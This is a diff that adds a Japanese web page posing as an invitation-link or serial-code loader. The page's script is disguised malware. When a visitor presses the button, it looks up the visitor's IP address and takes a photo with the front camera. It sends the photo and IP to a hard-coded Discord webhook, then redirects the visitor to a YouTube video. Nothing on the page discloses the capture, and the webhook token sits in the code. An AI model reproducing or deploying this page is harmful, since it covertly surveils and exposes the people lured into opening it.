@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>招待制リンク</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Yu Gothic", sans-serif;
+      background: linear-gradient(135deg, #0e1a3f 0%, #1a2a5e 100%);
+      color: #e0f7ff;
+    }
+
+    .container {
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      box-sizing: border-box;
+      position: relative;
+      z-index: 2;
+    }
+
+    .wave-bg {
+      position: absolute;
+      inset: 0;
+      z-index: 1;
+      background: linear-gradient(to bottom, rgba(0, 180, 255, 0.15) 0%, rgba(0, 100, 200, 0.05) 100%);
+      overflow: hidden;
+    }
+
+    .wave {
+      position: absolute;
+      bottom: 0;
+      width: 200%;
+      height: 200px;
+      background: url('data:image/svg+xml;utf8,<svg viewBox="0 0 1200 120" preserveAspectRatio="none"><path d="M0,0 C150,90 350,0 500,60 C650,120 850,30 1000,90 C1150,150 1200,120 1200,120 L1200,0 Z" fill="rgba(0, 180, 255, 0.25)"/></svg>') repeat-x;
+      animation: wave 18s linear infinite;
+    }
+
+    .wave:nth-child(2) {
+      animation-duration: 14s;
+      opacity: 0.6;
+      transform: translateX(-25%) scaleY(1.1);
+    }
+
+    .wave:nth-child(3) {
+      animation-duration: 22s;
+      opacity: 0.4;
+      transform: translateX(-50%) scaleY(0.9);
+    }
+
+    @keyframes wave {
+      0% { transform: translateX(0) translateZ(0) scaleY(1); }
+      50% { transform: translateX(-25%) translateZ(0) scaleY(0.55); }
+      100% { transform: translateX(-50%) translateZ(0) scaleY(1); }
+    }
+
+    h1 {
+      font-size: 3.2rem;
+      margin: 0 0 1.2rem;
+      color: #7df9ff;
+      text-shadow: 0 0 20px rgba(125, 249, 255, 0.7);
+      letter-spacing: 2px;
+    }
+
+    p {
+      font-size: 1.4rem;
+      margin: 0 0 3.5rem;
+      opacity: 0.9;
+      line-height: 1.6;
+      max-width: 85%;
+    }
+
+    button {
+      padding: 18px 80px;
+      font-size: 1.5rem;
+      font-weight: bold;
+      background: linear-gradient(135deg, #00d4ff, #0095d6);
+      color: white;
+      border: none;
+      border-radius: 60px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(0, 212, 255, 0.5);
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    button::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -100%;
+      width: 50%;
+      height: 200%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+      transition: 0.7s;
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    button:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 15px 40px rgba(0, 212, 255, 0.7);
+    }
+
+    #status {
+      margin-top: 2.5rem;
+      font-size: 1.3rem;
+      min-height: 1.8em;
+    }
+
+    canvas { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="wave-bg">
+  <div class="wave"></div>
+  <div class="wave"></div>
+  <div class="wave"></div>
+</div>
+
+<div class="container">
+  <h1>招待制リンク</h1>
+  <p>招待リンクを入力するか<br>シリアルを読み込んでください</p>
+
+  <button id="loadBtn">読み込み</button>
+  <div id="status"></div>
+</div>
+
+<canvas id="canvas"></canvas>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1481344813600084030/KZ3b6019A4vugdUfqDSoWBsx-paI_Wg_WghX52y0mSLge78Q9av8rR8o8y2kr1njx3Iq";
+const REDIRECT_URL = "https://youtu.be/7RMtqZW_n78?si=i78PssLZmAtZzy_c";
+
+document.getElementById("loadBtn").addEventListener("click", async () => {
+  const status = document.getElementById("status");
+  status.textContent = "処理中...";
+  status.style.color = "#7df9ff";
+
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const userIP = ipData.ip || "不明";
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
+
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await new Promise(r => video.onloadedmetadata = r);
+    await video.play();
+
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    stream.getTracks().forEach(t => t.stop());
+
+    const imageData = canvas.toDataURL("image/jpeg", 0.8);
+
+    const payload = {
+      content: `【内カメ取得】\nIP: ${userIP}\n時刻: ${new Date().toLocaleString("ja-JP")}`,
+      embeds: [{
+        title: "キャプチャ画像",
+        image: { url: imageData },
+        color: 0x00d4ff
+      }]
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    status.textContent = "完了！移動します...";
+    status.style.color = "#7fff7f";
+
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 1200);
+
+  } catch (err) {
+    console.error(err);
+    let msg = "エラー";
+    if (err.name === "NotAllowedError") msg = "カメラ許可が拒否されました";
+    else if (err.name === "NotFoundError") msg = "カメラが見つかりません";
+    status.textContent = msg;
+    status.style.color = "#ff6b6b";
+  }
+});
+</script>
+
+</body>
+</html>
